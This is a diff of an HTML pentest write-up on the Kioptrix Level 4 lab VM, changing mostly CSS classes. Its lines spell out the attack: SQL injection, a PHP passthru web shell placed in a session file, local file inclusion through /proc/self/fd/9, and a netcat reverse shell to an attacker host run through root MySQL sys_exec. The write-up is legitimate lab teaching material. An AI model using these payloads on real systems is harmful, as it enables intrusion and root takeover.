 </span><span class="gp">john@Kioptrix4:~$</span> mysql -u root -e <span class="s2">&quot;</span><span class="nv">$CMD</span><span class="s2">&quot;</span> mysql
@@ -657,16 +657,16 @@ chmod +x LinEnum.sh<span class="p">;</span> ./LinEnum.sh -t <span class="m">2</s
 </span><span class="hll"><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
 </span></pre></div>
 </div>
-<p>And we are root. Alternatively we could have added john to the admin group by changing our command to <code class="docutils literal"><span class="pre">select</span> <span class="pre">sys_exec('usermod</span> <span class="pre">-a</span> <span class="pre">-G</span> <span class="pre">admin</span> <span class="pre">john');</span></code>.</p>
+<p>And we are root. Alternatively we could have added john to the admin group by changing our command to <code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">sys_exec('usermod</span> <span class="pre">-a</span> <span class="pre">-G</span> <span class="pre">admin</span> <span class="pre">john');</span></code>.</p>
 </div>
 <div class="section" id="exploit-proc-self-fd-9-and-root-mysql">
-<h3>3.11.3.2. Exploit: <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code> and root mysql<a class="headerlink" href="#exploit-proc-self-fd-9-and-root-mysql" title="Permalink to this headline">¶</a></h3>
-<p>This is an unusual exploit based on <a class="reference external" href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/">Kioptrix - Level 4 (Local File Inclusion)</a>: use local file inclusion on <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code> to execute shell commands to get a reverse shell using mysql running as root.</p>
+<h3>3.11.3.2. Exploit: <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code> and root mysql<a class="headerlink" href="#exploit-proc-self-fd-9-and-root-mysql" title="Permalink to this headline">¶</a></h3>
+<p>This is an unusual exploit based on <a class="reference external" href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/">Kioptrix - Level 4 (Local File Inclusion)</a>: use local file inclusion on <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code> to execute shell commands to get a reverse shell using mysql running as root.</p>
 <div class="section" id="proc-self-fd-9-is-var-lib-php-phpsessid">
-<h4>3.11.3.2.1. <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code> is <code class="file docutils literal"><span class="pre">/var/lib/php_$PHPSESSID</span></code><a class="headerlink" href="#proc-self-fd-9-is-var-lib-php-phpsessid" title="Permalink to this headline">¶</a></h4>
+<h4>3.11.3.2.1. <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code> is <code class="file docutils literal notranslate"><span class="pre">/var/lib/php_$PHPSESSID</span></code><a class="headerlink" href="#proc-self-fd-9-is-var-lib-php-phpsessid" title="Permalink to this headline">¶</a></h4>
 <div class="section" id="proc-self-fd-9-background">
-<h5>3.11.3.2.1.1. <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code> background<a class="headerlink" href="#proc-self-fd-9-background" title="Permalink to this headline">¶</a></h5>
-<p>For general information on <code class="file docutils literal"><span class="pre">/proc</span></code> see:</p>
+<h5>3.11.3.2.1.1. <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code> background<a class="headerlink" href="#proc-self-fd-9-background" title="Permalink to this headline">¶</a></h5>
+<p>For general information on <code class="file docutils literal notranslate"><span class="pre">/proc</span></code> see:</p>
 <ul class="simple">
 <li><a class="reference external" href="http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html">Linux Filesystem Hierarchy 1.14. /proc</a></li>
 <li><a class="reference external" href="http://man7.org/linux/man-pages/man5/proc.5.html">Linux Programmer’s Manual PROC(5)</a></li>
@@ -674,9 +674,9 @@ chmod +x LinEnum.sh<span class="p">;</span> ./LinEnum.sh -t <span class="m">2</s
 </ul>
 </div>
 <div class="section" id="which-proc-self-fd-is-in-use">
-<h5>3.11.3.2.1.2. Which <code class="file docutils literal"><span class="pre">/proc/self/fd/?</span></code> is in use?<a class="headerlink" href="#which-proc-self-fd-is-in-use" title="Permalink to this headline">¶</a></h5>
+<h5>3.11.3.2.1.2. Which <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/?</span></code> is in use?<a class="headerlink" href="#which-proc-self-fd-is-in-use" title="Permalink to this headline">¶</a></h5>
 <p>The actual file descriptor integer number in use will vary. For this particular case you start searching from 0 until you don’t get an error:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/exploit
 <span class="hll"><span class="c1"># find FD in use (probably 9 but try starting at 0)</span>
@@ -694,9 +694,9 @@ chmod +x LinEnum.sh<span class="p">;</span> ./LinEnum.sh -t <span class="m">2</s
 <p>In our case it’s 9.</p>
 </div>
 <div class="section" id="what-does-proc-self-fd-fd-reference">
-<h5>3.11.3.2.1.3. What does <code class="file docutils literal"><span class="pre">/proc/self/fd/$FD</span></code> reference?<a class="headerlink" href="#what-does-proc-self-fd-fd-reference" title="Permalink to this headline">¶</a></h5>
-<p>It references <code class="file docutils literal"><span class="pre">/var/lib/php5/sess_$PHPSESSID</span></code>. That is, for cookie PHPSESSID=e67efa732b9b15b6def9824e1200db76, <code class="file docutils literal"><span class="pre">/proc/self/fd/$FD</span></code> references file <code class="file docutils literal"><span class="pre">/var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76</span></code> and <code class="docutils literal"><span class="pre">cat</span> <span class="pre">/var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76</span></code> gives the same output as <code class="file docutils literal"><span class="pre">/proc/self/fd/N</span></code>:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> on kioptrix4 - cat of /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76
+<h5>3.11.3.2.1.3. What does <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/$FD</span></code> reference?<a class="headerlink" href="#what-does-proc-self-fd-fd-reference" title="Permalink to this headline">¶</a></h5>
+<p>It references <code class="file docutils literal notranslate"><span class="pre">/var/lib/php5/sess_$PHPSESSID</span></code>. That is, for cookie PHPSESSID=e67efa732b9b15b6def9824e1200db76, <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/$FD</span></code> references file <code class="file docutils literal notranslate"><span class="pre">/var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76</span></code> and <code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">/var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76</span></code> gives the same output as <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/N</span></code>:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">#</span> on kioptrix4 - cat of /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76
 <span class="hll"><span class="gp">john@Kioptrix4:/var/lib/php5$</span> sudo cat sess_e67efa732b9b15b6def9824e1200db76
 </span><span class="hll"><span class="go">myusername|s:4:&quot;user&quot;;mypassword|s:12:&quot;&#39; OR 1=1-- -&quot;;</span>
 </span>
@@ -708,22 +708,22 @@ chmod +x LinEnum.sh<span class="p">;</span> ./LinEnum.sh -t <span class="m">2</s
 </span><span class="hll"><span class="go">myusername|s:4:&quot;user&quot;;mypassword|s:12:&quot;&#39; OR 1=1-- -&quot;;</span>
 </span></pre></div>
 </div>
-<p>So cookies are very important in the sense that they change <code class="file docutils literal"><span class="pre">/proc/self/fd/$FD</span></code>.</p>
+<p>So cookies are very important in the sense that they change <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/$FD</span></code>.</p>
 </div>
 <div class="section" id="what-s-in-proc-self-fd-fd">
-<h5>3.11.3.2.1.4. What’s in <code class="file docutils literal"><span class="pre">/proc/self/fd/$FD</span></code>?<a class="headerlink" href="#what-s-in-proc-self-fd-fd" title="Permalink to this headline">¶</a></h5>
+<h5>3.11.3.2.1.4. What’s in <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/$FD</span></code>?<a class="headerlink" href="#what-s-in-proc-self-fd-fd" title="Permalink to this headline">¶</a></h5>
 <p>Here is a peek at the session file for running shell commands in php:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">john@Kioptrix4:/var/lib/php5$</span> sudo cat sess_9c41e85731871e88a3a2ba265cf5c6bb
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">john@Kioptrix4:/var/lib/php5$</span> sudo cat sess_9c41e85731871e88a3a2ba265cf5c6bb
 <span class="go">myusername|s:4:&quot;user&quot;;mypassword|s:58:&quot;&#39; OR 1=1-- - &lt;?php echo &quot;\n\n&quot;; passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;;</span>
 </pre></div>
 </div>
-<p>It contains the form input fields: here “myusername” and “mypassword” field names followed by “|”; then a colon-separated triple of the data type “s” for string; field length of 4 and 58, respectively; and the actual value. When mypassword is included in a mysql query the <code class="docutils literal"><span class="pre">OR</span> <span class="pre">1=1</span></code> causes the login to succeed and the <code class="docutils literal"><span class="pre">--</span></code> comments out the rest (the php part). When we use a local file inclusion of session file, the trailing <code class="docutils literal"><span class="pre">&lt;?php</span> <span class="pre">...</span> <span class="pre">?&gt;</span></code> is executed as php code, running our command. That’s how this exploit works.</p>
+<p>It contains the form input fields: here “myusername” and “mypassword” field names followed by “|”; then a colon-separated triple of the data type “s” for string; field length of 4 and 58, respectively; and the actual value. When mypassword is included in a mysql query the <code class="docutils literal notranslate"><span class="pre">OR</span> <span class="pre">1=1</span></code> causes the login to succeed and the <code class="docutils literal notranslate"><span class="pre">--</span></code> comments out the rest (the php part). When we use a local file inclusion of session file, the trailing <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">...</span> <span class="pre">?&gt;</span></code> is executed as php code, running our command. That’s how this exploit works.</p>
 </div>
 </div>
 <div class="section" id="logging-in-and-running-shell-commands-via-proc-self-fd-fd">
-<h4>3.11.3.2.2. Logging in and running shell commands via <code class="file docutils literal"><span class="pre">/proc/self/fd/$FD</span></code><a class="headerlink" href="#logging-in-and-running-shell-commands-via-proc-self-fd-fd" title="Permalink to this headline">¶</a></h4>
-<p>Local file inclusion provides limited reconnaissance; what’s really needed is to run some remote shell commands. We do this by including <code class="docutils literal"><span class="pre">&lt;?php</span> <span class="pre">echo</span> <span class="pre">&quot;\\n\\n&quot;;</span> <span class="pre">passthru(\$_GET['cmd']);</span> <span class="pre">?&gt;</span></code> at the end of <code class="file docutils literal"><span class="pre">/proc/self/fd/$FD</span></code>. Its contents consist of a string having 2 parts: the mysql injection with a trailing “– -” which makes mysql ignore the rest of the string, followed by the php script. Once we set this up we can run commands on kioptrix4. Here’s an example of some simple commands:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># assumes $FD computed as above</span>
+<h4>3.11.3.2.2. Logging in and running shell commands via <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/$FD</span></code><a class="headerlink" href="#logging-in-and-running-shell-commands-via-proc-self-fd-fd" title="Permalink to this headline">¶</a></h4>
+<p>Local file inclusion provides limited reconnaissance; what’s really needed is to run some remote shell commands. We do this by including <code class="docutils literal notranslate"><span class="pre">&lt;?php</span> <span class="pre">echo</span> <span class="pre">&quot;\\n\\n&quot;;</span> <span class="pre">passthru(\$_GET['cmd']);</span> <span class="pre">?&gt;</span></code> at the end of <code class="file docutils literal notranslate"><span class="pre">/proc/self/fd/$FD</span></code>. Its contents consist of a string having 2 parts: the mysql injection with a trailing “– -” which makes mysql ignore the rest of the string, followed by the php script. Once we set this up we can run commands on kioptrix4. Here’s an example of some simple commands:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># assumes $FD computed as above</span>
 <span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/exploit
@@ -753,15 +753,15 @@ curl --silent --get --cookie <span class="nv">$COOKIES_CMD</span> <span class="s
 </div>
 <div class="section" id="getting-root">
 <h4>3.11.3.2.3. Getting root<a class="headerlink" href="#getting-root" title="Permalink to this headline">¶</a></h4>
-<p>Now at this point we can carry out reconnaissance just like the other exploits. We could even do a reverse bash shell via <code class="docutils literal"><span class="pre">CMD=&quot;/bin/netcat</span> <span class="pre">$KALI</span> <span class="pre">$PORT</span> <span class="pre">-e</span> <span class="pre">/bin/bash&quot;</span></code>. We could reproduce finding out that mysql is running as root and the /usr/lib/lib_mysqludf_sys.so sys_exec UDF is already installed providing <code class="docutils literal"><span class="pre">sys_exec()</span></code>. After all that work we can simply set up a listener on the Kali side prior to firing off a root shell via mysql. Here’s the Kali listener (run from a different terminal window):</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
+<p>Now at this point we can carry out reconnaissance just like the other exploits. We could even do a reverse bash shell via <code class="docutils literal notranslate"><span class="pre">CMD=&quot;/bin/netcat</span> <span class="pre">$KALI</span> <span class="pre">$PORT</span> <span class="pre">-e</span> <span class="pre">/bin/bash&quot;</span></code>. We could reproduce finding out that mysql is running as root and the /usr/lib/lib_mysqludf_sys.so sys_exec UDF is already installed providing <code class="docutils literal notranslate"><span class="pre">sys_exec()</span></code>. After all that work we can simply set up a listener on the Kali side prior to firing off a root shell via mysql. Here’s the Kali listener (run from a different terminal window):</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix4
 <span class="nb">source</span> <span class="nv">$PT</span>/kioptrix4_setup.sh
 <span class="nb">cd</span> <span class="nv">$PT</span>/exploit
 <span class="nv">$SUDO</span> socat - TCP-LISTEN:<span class="nv">$PORT</span>
 </pre></div>
 </div>
 <p>Back in the original terminal window, use <strong class="program">curl</strong> to open up a reverse shell:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">CMD2</span><span class="o">=</span><span class="s2">&quot;/bin/netcat </span><span class="nv">$KALI</span><span class="s2"> </span><span class="nv">$PORT</span><span class="s2"> -e /bin/bash&quot;</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">CMD2</span><span class="o">=</span><span class="s2">&quot;/bin/netcat </span><span class="nv">$KALI</span><span class="s2"> </span><span class="nv">$PORT</span><span class="s2"> -e /bin/bash&quot;</span>
 <span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;mysql -u root -e \&quot;select sys_exec(\\\&quot;</span><span class="nv">$CMD2</span><span class="s2">\\\&quot;)\&quot; mysql&quot;</span>
 curl --silent --get --cookie <span class="nv">$COOKIES_CMD</span> <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> <span class="se">\</span>
   --data <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;/proc/self/fd/</span><span class="nv">$FD</span><span class="s2">%00&quot;</span> <span class="se">\</span>
@@ -769,7 +769,7 @@ curl --silent --get --cookie <span class="nv">$COOKIES_CMD</span> <span class="s
 </pre></div>
 </div>
 <p>A root reverse shell opens in the Kali listener terminal window:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@triple:~/pentest/kioptrix4/exploit$ $</span>SUDO socat - TCP-LISTEN:<span class="nv">$PORT</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@triple:~/pentest/kioptrix4/exploit$ $</span>SUDO socat - TCP-LISTEN:<span class="nv">$PORT</span>
 <span class="go">id</span>
 <span class="go">uid=0(root) gid=0(root)</span>
 <span class="go">export TERM=linux</span>
